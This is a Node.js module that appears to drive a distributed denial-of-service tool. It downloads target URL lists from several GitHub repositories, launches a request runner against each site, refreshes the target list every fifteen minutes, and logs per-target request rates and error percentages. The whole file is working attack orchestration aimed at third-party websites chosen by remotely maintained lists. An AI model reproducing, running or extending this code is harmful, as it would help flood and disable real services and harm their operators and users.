/**
 * @type {import('axios').AxiosStatic}
 */
const axios = require('axios')
const { assert } = require('console')
const { EventEmitter } = require('events')

const { sleep } = require('./helpers')
const { runner } = require('./runner')

// interval between printing stats and calculating error rate
const logInterval = 60 * 1000
const urlsPoolInterval = 15 * 60 * 1000
const sitesUrls =
  process.env.SKIP_SHIELD_LISTS === 'true'
    ? []
    : [
        'https://raw.githubusercontent.com/opengs/uashieldtargets/v2/sites.json',
        'https://raw.githubusercontent.com/mgrybyk/uasword/master/data/sites.json',
      ]
const sitesPlainListUrls =
  process.env.SKIP_DDOSER_LISTS === 'true'
    ? []
    : ['https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt']

const main = async () => {
  const eventEmitter = new EventEmitter()
  eventEmitter.setMaxListeners(100)

  let urlList = await getSites()
  await run(eventEmitter, urlList)

  statsLogger(eventEmitter)
  siteListUpdater(eventEmitter, urlList)
}

/**
 * @param {EventEmitter} eventEmitter
 * @param {string[]} urlList
 */
const siteListUpdater = (eventEmitter, urlList) => {
  setInterval(async () => {
    const updatedUrlList = await getSites({ ignoreError: true })

    if (updatedUrlList.filter((s) => !urlList.includes(s)).length > 0) {
      eventEmitter.emit('RUNNER_STOP')
      console.log('\n', new Date().toISOString(), 'Updating urls list\n')
      urlList.length = 0
      urlList = updatedUrlList
      run(eventEmitter, urlList)
    }
  }, urlsPoolInterval)
}

/**
 * @param {EventEmitter} eventEmitter
 * @param {string[]} urlList
 */
const run = async (eventEmitter, urlList) => {
  for (let i = 0; i < urlList.length; i++) {
    await sleep(1000)
    runner(urlList[i], eventEmitter)
  }
}

/**
 * @param {EventEmitter} eventEmitter
 */
const statsLogger = (eventEmitter) => {
  let stats = []
  let totalRequests = 0

  eventEmitter.on('RUNNER_STATS', (s) => {
    stats.push(s)
    totalRequests += s.new_reqs
  })

  setInterval(() => {
    stats.length = 0
    eventEmitter.emit('GET_STATS')
    setTimeout(() => {
      const activeRunners = stats.filter(({ isActive }) => isActive)
      const totalRps = activeRunners.reduce((prev, { rps }) => prev + rps, 0)
      activeRunners.forEach(({ url, total_reqs, errRate, rps, concurrentReqs }) => {
        console.log(url, '|', 'Req', total_reqs, '|', 'Current Errors,%', errRate, '| rps', rps, '| CR', concurrentReqs)
      })
      console.log(
        'Total Requests',
        totalRequests,
        '| Active runners',
        activeRunners.length,
        'of',
        stats.length,
        '| Total rps',
        totalRps
      )
    }, 1000)
  }, logInterval)
}

/**
 *
 * @returns {Promise<string[]>}
 */
const getSites = async ({ ignoreError = false } = {}) => {
  let urlList = []

  for (const sitesUrl of sitesUrls) {
    try {
      const res = await axios.get(sitesUrl)
      assert(Array.isArray(res.data))
      if (res.data.length > 0) {
        assert(typeof res.data[0].page === 'string')
      }
      urlList.push(...res.data.map((x) => x.page))
    } catch (err) {
      if (ignoreError) {
        console.log(new Date().toISOString(), 'WARN: Failed to get new urls list from', sitesUrl)
      }
      throw err
    }
  }

  for (const sitesUrl of sitesPlainListUrls) {
    try {
      const res = await axios.get(sitesUrl)
      assert(typeof res.data === 'string')
      urlList.push(...res.data.split('\n').filter((s) => s.startsWith('http')))
    } catch (err) {
      if (ignoreError) {
        console.log(new Date().toISOString(), 'WARN: Failed to get new urls list from', sitesUrl)
      }
      throw err
    }
  }

  return [...new Set(urlList)]
}

module.exports = { main }
